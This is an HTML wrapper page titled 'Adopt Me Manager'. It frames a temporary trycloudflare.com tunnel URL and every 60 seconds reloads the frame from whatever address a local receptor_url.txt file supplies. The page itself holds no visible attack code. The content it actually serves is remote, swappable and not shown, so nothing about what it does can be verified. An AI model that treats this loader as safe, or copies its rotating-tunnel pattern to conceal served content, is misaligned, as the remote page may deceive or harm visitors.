<!DOCTYPE html>
<html>
<head>
    <title>Adopt Me Manager</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe id="app-frame" src="https://evaluations-paso-camel-vermont.trycloudflare.com"></iframe>
    <script>
        const receptorFile = 'receptor_url.txt';
        let currentUrl = 'https://evaluations-paso-camel-vermont.trycloudflare.com';

        async function checkUrl() {
            try {
                // Add timestamp to prevent caching
                const response = await fetch(receptorFile + '?t=' + new Date().getTime());
                if (response.ok) {
                    const text = await response.text();
                    const newUrl = text.trim();
                    if (newUrl && newUrl !== currentUrl) {
                        console.log('URL changed to: ' + newUrl);
                        currentUrl = newUrl;
                        document.getElementById('app-frame').src = currentUrl;
                    }
                }
            } catch (e) {
                console.error('Failed to fetch receptor url:', e);
            }
        }

        // Check every 60 seconds
        setInterval(checkUrl, 60000);
    </script>
</body>
</html>